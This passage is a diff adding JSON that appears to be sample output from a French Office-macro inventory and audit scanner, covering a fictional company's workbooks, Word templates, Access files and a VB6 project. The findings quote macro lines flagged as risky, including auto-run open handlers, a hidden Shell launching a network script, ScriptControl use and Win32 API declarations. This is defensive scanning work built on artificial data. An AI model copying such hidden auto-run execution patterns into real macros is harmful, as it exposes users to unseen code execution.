+     "regle": "SEC-003",
+     "ligne": 1,
+     "extrait": "Private Sub Workbook_Open()",
+     "module": "ThisWorkbook"
+    }
+   ],
+   "erreurs": [],
+   "taille": 5637,
+   "modifieDisque": "2021-01-01T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Finance/Calcul des primes.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "C. Martin",
+    "dernierAuteur": "C. Martin",
+    "modifie": "2019-05-02T10:00:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modFormules",
+       "type": "module",
+       "lignes": 8,
+       "lignesCode": 7,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "03ef2a460eb0432c"
+      },
+      {
+       "nom": "modApi",
+       "type": "module",
+       "lignes": 15,
+       "lignesCode": 12,
+       "procedures": 2,
+       "declares": 2,
+       "empreinte": "44e424f94438798e"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "MSScriptControl.ScriptControl"
+   ],
+   "lignesCode": 19,
+   "empreinteProjet": "f8a6ddf8abe0fec0",
+   "constats": [
+    {
+     "regle": "B64-001",
+     "ligne": 2,
+     "extrait": "Private Declare Sub Sleep Lib \"kernel32\" (ByVal dwMilliseconds As Long)",
+     "module": "modApi"
+    },
+    {
+     "regle": "B64-001",
+     "ligne": 3,
+     "extrait": "Private Declare Function GetUserName Lib \"advapi32.dll\" Alias \"GetUserNameA\" (ByVal lpBuffer As String, nSize As Long) As Long",
+     "module": "modApi"
+    },
+    {
+     "regle": "VBS-003",
+     "ligne": 4,
+     "extrait": "Set sc = CreateObject(\"MSScriptControl.ScriptControl\")",
+     "module": "modFormules"
+    }
+   ],
+   "erreurs": [],
+   "taille": 3948,
+   "modifieDisque": "2023-11-15T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Finance/Rapprochement bancaire.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "L. Bernard",
+    "dernierAuteur": "L. Bernard",
+    "modifie": "2025-02-17T08:45:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      },
+      {
+       "nom": "VBScript_RegExp_55",
+       "guid": "3F4DACA7-160D-11D2-A8E9-00104B365C9F",
+       "version": "5.5",
+       "chemin": "C:\\Windows\\System32\\vbscript.dll\\3",
+       "description": "Microsoft VBScript Regular Expressions 5.5",
+       "type": "registered"
+      },
+      {
+       "nom": "ADODB",
+       "guid": "B691E011-1797-432E-907A-4D8C69339129",
+       "version": "6.1",
+       "chemin": "C:\\Program Files\\Common Files\\System\\ado\\msado15.dll",
+       "description": "Microsoft ActiveX Data Objects 6.1 Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 5,
+       "lignesCode": 4,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "b8fb93d0a20db3bb"
+      },
+      {
+       "nom": "Feuil1",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modIban",
+       "type": "module",
+       "lignes": 12,
+       "lignesCode": 11,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "f6f364e001c257b3"
+      },
+      {
+       "nom": "modSql",
+       "type": "module",
+       "lignes": 10,
+       "lignesCode": 9,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "f15da24c158c223d"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "ADODB.Connection",
+    "VBScript.RegExp"
+   ],
+   "lignesCode": 24,
+   "empreinteProjet": "32e036be3ba11a5b",
+   "constats": [
+    {
+     "regle": "VBS-001",
+     "module": "(références)",
+     "ligne": 0,
+     "extrait": "VBScript_RegExp_55 — C:\\Windows\\System32\\vbscript.dll\\3"
+    },
+    {
+     "regle": "VBS-001",
+     "ligne": 4,
+     "extrait": "Set re = CreateObject(\"VBScript.RegExp\")",
+     "module": "modIban"
+    },
+    {
+     "regle": "CNX-001",
+     "ligne": 4,
+     "extrait": "Set cn = CreateObject(\"ADODB.Connection\")",
+     "module": "modSql"
+    },
+    {
+     "regle": "CNX-001",
+     "ligne": 5,
+     "extrait": "cn.Open \"Provider=SQLOLEDB;Data Source=SRV-SQL02;Initial Catalog=Compta;Integrated Security=SSPI;\"",
+     "module": "modSql"
+    },
+    {
+     "regle": "SEC-003",
+     "ligne": 1,
+     "extrait": "Private Sub Workbook_Open()",
+     "module": "ThisWorkbook"
+    }
+   ],
+   "erreurs": [],
+   "taille": 4489,
+   "modifieDisque": "2022-06-08T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Production/Applications/BancTest/BancTest.vbp",
+   "famille": "vb6",
+   "extension": "vbp",
+   "format": "vb6",
+   "courriel": {
+    "mecanismes": [
+     "OUT-001"
+    ],
+    "envoiDirect": 1,
+    "affichage": 0,
+    "piecesJointes": 0,
+    "lectureBoite": 0
+   },
+   "macros": true,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "BancTest",
+     "langage": "vb6",
+     "vb6": {
+      "type": "Exe",
+      "nom": "BancTest",
+      "exe": "BancTest.exe",
+      "membres": 4,
+      "manquants": []
+     },
+     "objets": [
+      {
+       "guid": "648A5603-2C6E-101B-82B6-000000000014",
+       "version": "1.1",
+       "fichier": "MSCOMM32.OCX"
+      },
+      {
+       "guid": "831FDD16-0C5C-11D2-A9FC-0000F8754DA1",
+       "version": "2.0",
+       "fichier": "MSCOMCTL.OCX"
+      },
+      {
+       "guid": "0BA686C6-F7D3-101A-993E-0000C0EF6F5E",
+       "version": "1.0",
+       "fichier": "THREED32.OCX"
+      }
+     ],
+     "protege": false,
+     "references": [
+      {
+       "nom": "OLE Automation",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "..\\..\\..\\Windows\\SysWOW64\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Microsoft VBScript Regular Expressions 5.5",
+       "guid": "3F4DACA7-160D-11D2-A8E9-00104B365C9F",
+       "version": "5.5",
+       "chemin": "..\\..\\..\\Windows\\SysWOW64\\vbscript.dll\\3",
+       "description": "Microsoft VBScript Regular Expressions 5.5",
+       "type": "registered"
+      },
+      {
+       "nom": "Microsoft DAO 3.6 Object Library",
+       "guid": "00025E01-0000-0000-C000-000000000046",
+       "version": "5.0",
+       "chemin": "..\\..\\..\\Program Files (x86)\\Common Files\\Microsoft Shared\\DAO\\dao360.dll",
+       "description": "Microsoft DAO 3.6 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "frmBanc",
+       "type": "formulaire",
+       "lignes": 24,
+       "lignesCode": 20,
+       "procedures": 3,
+       "declares": 0,
+       "empreinte": "f4bf01968ecb36d0"
+      },
+      {
+       "nom": "modMesures",
+       "type": "module",
+       "lignes": 17,
+       "lignesCode": 14,
+       "procedures": 2,
+       "declares": 2,
+       "empreinte": "54a84731147b6ce2"
+      },
+      {
+       "nom": "modAlerte",
+       "type": "module",
+       "lignes": 12,
+       "lignesCode": 10,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "eba37e41134a05ce"
+      },
+      {
+       "nom": "clsJournal",
+       "type": "classe",
+       "lignes": 10,
+       "lignesCode": 8,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "8efd23f60511062b"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "Outlook.Application"
+   ],
+   "lignesCode": 52,
+   "empreinteProjet": "0ea1df4a69a9ba5a",
+   "constats": [
+    {
+     "regle": "VB6-010",
+     "module": "(références)",
+     "ligne": 0,
+     "extrait": "Microsoft VBScript Regular Expressions 5.5 — ..\\..\\..\\Windows\\SysWOW64\\vbscript.dll\\3"
+    },
+    {
+     "regle": "OUT-001",
+     "ligne": 5,
+     "extrait": "Set ol = CreateObject(\"Outlook.Application\")",
+     "module": "modAlerte"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 13,
+     "extrait": "Set db = DBEngine.OpenDatabase(\"\\\\srv-prod\\banc\\mesures.mdb\")",
+     "module": "modMesures"
+    },
+    {
+     "regle": "VB6-002",
+     "module": "(composants)",
+     "ligne": 0,
+     "extrait": "THREED32.OCX"
+    },
+    {
+     "regle": "VB6-001",
+     "module": "(projet)",
+     "ligne": 0,
+     "extrait": "BancTest · Exe · BancTest.exe"
+    },
+    {
+     "regle": "VB6-004",
+     "module": "(composants)",
+     "ligne": 0,
+     "extrait": "MSCOMM32.OCX"
+    }
+   ],
+   "erreurs": [],
+   "taille": 858,
+   "modifieDisque": "2021-06-14T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Production/Arrêts machines.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "A. Moreau",
+    "dernierAuteur": "A. Moreau",
+    "modifie": "2021-01-15T11:00:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modArrets",
+       "type": "module",
+       "lignes": 5,
+       "lignesCode": 4,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "bbe46a7e2bfe7d2e"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 4,
+   "empreinteProjet": "0a1cdf0c6730d118",
+   "constats": [
+    {
+     "regle": "B64-003",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "contrôle {BDD1F04B-858B-11D1-B16A-00C0F0283628}"
+    }
+   ],
+   "erreurs": [],
+   "taille": 3856,
+   "modifieDisque": "2025-10-10T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Production/Copie abîmée.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "inconnu",
+   "macros": false,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [],
+   "progIds": [],
+   "lignesCode": 0,
+   "empreinteProjet": null,
+   "constats": [
+    {
+     "regle": "FMT-003",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "fin d'archive ZIP introuvable"
+    }
+   ],
+   "erreurs": [
+    "fin d'archive ZIP introuvable"
+   ],
+   "taille": 1672,
+   "modifieDisque": "2021-08-03T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Production/Relevés capteurs ligne 2.xls",
+   "famille": "excel",
+   "extension": "xls",
+   "format": "ole",
+   "macros": true,
+   "meta": {
+    "auteur": "A. Moreau",
+    "dernierAuteur": "A. Moreau",
+    "modifie": "2023-06-15T08:00:00.000Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "modDde",
+       "type": "module",
+       "lignes": 9,
+       "lignesCode": 8,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "9eec6bb308d7e6d1"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 8,
+   "empreinteProjet": "a8b562d22da06a4c",
+   "constats": [
+    {
+     "regle": "DDE-001",
+     "ligne": 4,
+     "extrait": "canal = DDEInitiate(\"RSLinx\", \"LIGNE2\")",
+     "module": "modDde"
+    },
+    {
+     "regle": "DDE-001",
+     "ligne": 5,
+     "extrait": "Feuil1.Range(\"B4\").Value = DDERequest(canal, \"N7:0\")",
+     "module": "modDde"
+    },
+    {
+     "regle": "DDE-001",
+     "ligne": 6,
+     "extrait": "DDETerminate canal",
+     "module": "modDde"
+    },
+    {
+     "regle": "XLM-002",
+     "ligne": 7,
+     "extrait": "Feuil1.Range(\"C4\").Value = ExecuteExcel4Macro(\"GET.CELL(5,Feuil1!B4)\")",
+     "module": "modDde"
+    },
+    {
+     "regle": "FMT-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": ""
+    }
+   ],
+   "erreurs": [],
+   "taille": 9216,
+   "modifieDisque": "2024-05-03T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Production/Suivi des ordres de fabrication.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "A. Moreau",
+    "dernierAuteur": "A. Moreau",
+    "modifie": "2024-06-28T07:30:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      },
+      {
+       "nom": "DAO",
+       "guid": "00025E01-0000-0000-C000-000000000046",
+       "version": "5.0",
+       "chemin": "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\DAO\\dao360.dll",
+       "description": "Microsoft DAO 3.6 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 5,
+       "lignesCode": 4,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "b8fb93d0a20db3bb"
+      },
+      {
+       "nom": "Feuil1",
+       "type": "document",
+       "lignes": 4,
+       "lignesCode": 3,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "ca6747057dbed37f"
+      },
+      {
+       "nom": "modErp",
+       "type": "module",
+       "lignes": 7,
+       "lignesCode": 6,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "ad8df8b427df91a3"
+      },
+      {
+       "nom": "modOrdres",
+       "type": "module",
+       "lignes": 9,
+       "lignesCode": 7,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "6db7e032036bf0a3"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "ADODB.Connection"
+   ],
+   "lignesCode": 20,
+   "empreinteProjet": "56f7fe85df37e3be",
+   "constats": [
+    {
+     "regle": "B64-004",
+     "module": "(références)",
+     "ligne": 0,
+     "extrait": "DAO — C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\DAO\\dao360.dll"
+    },
+    {
+     "regle": "B64-004",
+     "ligne": 5,
+     "extrait": "cn.Open \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=P:\\Production\\Donnees\\ordres.mdb\"",
+     "module": "modOrdres"
+    },
+    {
+     "regle": "VBS-002",
+     "ligne": 4,
+     "extrait": "cmd = \"cscript //nologo \\\\srv-app01\\scripts\\export_erp.vbs \" & Chr(34) & ThisWorkbook.FullName & Chr(34)",
+     "module": "modErp"
+    },
+    {
+     "regle": "ACX-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "contrôle {D7053240-CE69-11CD-A777-00DD01143C57}"
+    },
+    {
+     "regle": "ACX-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "contrôle {D7053240-CE69-11CD-A777-00DD01143C57}"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 4,
+     "extrait": "cmd = \"cscript //nologo \\\\srv-app01\\scripts\\export_erp.vbs \" & Chr(34) & ThisWorkbook.FullName & Chr(34)",
+     "module": "modErp"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 5,
+     "extrait": "cn.Open \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=P:\\Production\\Donnees\\ordres.mdb\"",
+     "module": "modOrdres"
+    },
+    {
+     "regle": "CNX-001",
+     "ligne": 4,
+     "extrait": "Set cn = CreateObject(\"ADODB.Connection\")",
+     "module": "modOrdres"
+    },
+    {
+     "regle": "CNX-001",
+     "ligne": 5,
+     "extrait": "cn.Open \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=P:\\Production\\Donnees\\ordres.mdb\"",
+     "module": "modOrdres"
+    },
+    {
+     "regle": "SEC-001",
+     "ligne": 5,
+     "extrait": "Shell cmd, vbHide",
+     "module": "modErp"
+    },
+    {
+     "regle": "SEC-003",
+     "ligne": 1,
+     "extrait": "Private Sub Workbook_Open()",
+     "module": "ThisWorkbook"
+    }
+   ],
+   "erreurs": [],
+   "taille": 4897,
+   "modifieDisque": "2023-12-23T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Qualité/Annuaire fournisseurs.accdb",
+   "famille": "access",
+   "extension": "accdb",
+   "format": "access",
+   "macros": false,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [],
+   "progIds": [],
+   "lignesCode": 0,
+   "empreinteProjet": null,
+   "constats": [],
+   "erreurs": [],
+   "taille": 4096,
+   "modifieDisque": "2023-03-20T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Qualité/Base des non-conformités.accdb",
+   "famille": "access",
+   "extension": "accdb",
+   "format": "access",
+   "macros": true,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [],
+   "progIds": [],
+   "lignesCode": 0,
+   "empreinteProjet": null,
+   "constats": [
+    {
+     "regle": "ACC-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": "code VBA probable, non extrait"
+    }
+   ],
+   "erreurs": [],
+   "taille": 8192,
+   "modifieDisque": "2022-10-13T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/Qualité/Export Access/modAlertes.bas",
+   "famille": "module",
+   "extension": "bas",
+   "format": "texte",
+   "courriel": {
+    "mecanismes": [
+     "OUT-002"
+    ],
+    "envoiDirect": 1,
+    "affichage": 0,
+    "piecesJointes": 0,
+    "lectureBoite": 0
+   },
+   "macros": true,
+   "meta": {},
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "modAlertes",
+     "protege": false,
+     "references": [],
+     "modules": [
+      {
+       "nom": "modAlertes",
+       "type": "module",
+       "lignes": 7,
+       "lignesCode": 5,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "e5c7979ca1323af4"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 5,
+   "empreinteProjet": "0d9df4ba6aee7959",
+   "constats": [
+    {
+     "regle": "OUT-002",
+     "ligne": 5,
+     "extrait": "DoCmd.SendObject acSendReport, \"rptNonConformite\", acFormatPDF,  \"qualite@exemple.invalid\", , , \"Non-conformité \" & idNc, \"Fiche jointe.\", False",
+     "module": "modAlertes"
+    }
+   ],
+   "erreurs": [],
+   "taille": 292,
+   "modifieDisque": "2025-01-07T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/RH/Modèles/Attestation employeur.doc",
+   "famille": "word",
+   "extension": "doc",
+   "format": "ole",
+   "macros": true,
+   "meta": {
+    "auteur": "M. Dupont",
+    "dernierAuteur": "M. Dupont",
+    "modifie": "2023-06-15T08:00:00.000Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisDocument",
+       "type": "document",
+       "lignes": 4,
+       "lignesCode": 3,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "f6a940ad2922e1f9"
+      },
+      {
+       "nom": "modChamps",
+       "type": "module",
+       "lignes": 10,
+       "lignesCode": 7,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "c47dab28524e911b"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 10,
+   "empreinteProjet": "18aba405fc67ae76",
+   "constats": [
+    {
+     "regle": "FMT-001",
+     "module": "(fichier)",
+     "ligne": 0,
+     "extrait": ""
+    },
+    {
+     "regle": "SEC-003",
+     "ligne": 1,
+     "extrait": "Private Sub Document_Open()",
+     "module": "ThisDocument"
+    }
+   ],
+   "erreurs": [],
+   "taille": 9728,
+   "modifieDisque": "2022-07-16T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/RH/Modèles/Courrier type.docm",
+   "famille": "word",
+   "extension": "docm",
+   "format": "ooxml",
+   "courriel": {
+    "mecanismes": [
+     "OUT-001"
+    ],
+    "envoiDirect": 1,
+    "affichage": 0,
+    "piecesJointes": 1,
+    "lectureBoite": 0
+   },
+   "macros": true,
+   "meta": {
+    "auteur": "M. Dupont",
+    "dernierAuteur": "M. Dupont",
+    "modifie": "2022-03-01T09:00:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": false,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      },
+      {
+       "nom": "Outlook",
+       "guid": "00062FFF-0000-0000-C000-000000000046",
+       "version": "9.6",
+       "chemin": "C:\\Program Files\\Microsoft Office\\root\\Office16\\MSOUTL.OLB",
+       "description": "Microsoft Outlook 16.0 Object Library",
+       "type": "registered"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisDocument",
+       "type": "document",
+       "lignes": 4,
+       "lignesCode": 3,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "f6a940ad2922e1f9"
+      },
+      {
+       "nom": "modPublipostage",
+       "type": "module",
+       "lignes": 12,
+       "lignesCode": 10,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "498088bce91deb5f"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [
+    "Outlook.Application"
+   ],
+   "lignesCode": 13,
+   "empreinteProjet": "913cfa9c1f078c5b",
+   "constats": [
+    {
+     "regle": "OUT-001",
+     "module": "(références)",
+     "ligne": 0,
+     "extrait": "Outlook — C:\\Program Files\\Microsoft Office\\root\\Office16\\MSOUTL.OLB"
+    },
+    {
+     "regle": "OUT-001",
+     "ligne": 5,
+     "extrait": "Set ol = CreateObject(\"Outlook.Application\")",
+     "module": "modPublipostage"
+    },
+    {
+     "regle": "CHM-001",
+     "ligne": 9,
+     "extrait": "msg.Attachments.Add \"\\\\srv-fichiers\\finance\\exports\\suivi.pdf\"",
+     "module": "modPublipostage"
+    },
+    {
+     "regle": "SEC-003",
+     "ligne": 1,
+     "extrait": "Private Sub Document_Open()",
+     "module": "ThisDocument"
+    }
+   ],
+   "erreurs": [],
+   "taille": 3464,
+   "modifieDisque": "2021-02-09T09:00:00.000Z"
+  },
+  {
+   "chemin": "Exemple-Industrie/RH/Planning des congés.xlsm",
+   "famille": "excel",
+   "extension": "xlsm",
+   "format": "ooxml",
+   "macros": true,
+   "meta": {
+    "auteur": "M. Dupont",
+    "dernierAuteur": "M. Dupont",
+    "modifie": "2023-09-12T14:10:00Z"
+   },
+   "signature": {
+    "etat": "aucune",
+    "certificats": []
+   },
+   "projets": [
+    {
+     "nom": "VBAProject",
+     "protege": true,
+     "references": [
+      {
+       "nom": "stdole",
+       "guid": "00020430-0000-0000-C000-000000000046",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\System32\\stdole2.tlb",
+       "description": "OLE Automation",
+       "type": "registered"
+      },
+      {
+       "nom": "Office",
+       "guid": "2DF8D04C-5BFA-101B-BDE5-00AA0044DE52",
+       "version": "2.0",
+       "chemin": "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL",
+       "description": "Microsoft Office 16.0 Object Library",
+       "type": "registered"
+      },
+      {
+       "nom": "MSComCtl2",
+       "guid": "86CF1D34-0C5F-11D2-A9FC-0000F8754DA1",
+       "version": "2.0",
+       "chemin": "C:\\Windows\\SysWOW64\\MSCOMCT2.OCX",
+       "description": "Microsoft Windows Common Controls-2 6.0 (SP6)",
+       "type": "control"
+      },
+      {
+       "nom": "MSComctlLib",
+       "guid": "831FDD16-0C5C-11D2-A9FC-0000F8754DA1",
+       "version": "2.2",
+       "chemin": "C:\\Windows\\SysWOW64\\MSCOMCTL.OCX",
+       "description": "Microsoft Windows Common Controls 6.0 (SP6)",
+       "type": "control"
+      }
+     ],
+     "modules": [
+      {
+       "nom": "ThisWorkbook",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "Feuil1",
+       "type": "document",
+       "lignes": 1,
+       "lignesCode": 0,
+       "procedures": 0,
+       "declares": 0,
+       "empreinte": "e3b0c44298fc1c14"
+      },
+      {
+       "nom": "frmSaisie",
+       "type": "formulaire",
+       "lignes": 11,
+       "lignesCode": 9,
+       "procedures": 2,
+       "declares": 0,
+       "empreinte": "387bcd2000734c97"
+      },
+      {
+       "nom": "modArchive",
+       "type": "module",
+       "lignes": 6,
+       "lignesCode": 5,
+       "procedures": 1,
+       "declares": 0,
+       "empreinte": "e16ec7b8a9c97578"
+      },
+      {
+       "nom": "modApi",
+       "type": "module",
+       "lignes": 13,
+       "lignesCode": 8,
+       "procedures": 1,
+       "declares": 4,
+       "empreinte": "167b261e0bcd2234"
+      }
+     ],
+     "erreurs": []
+    }
+   ],
+   "progIds": [],
+   "lignesCode": 22,
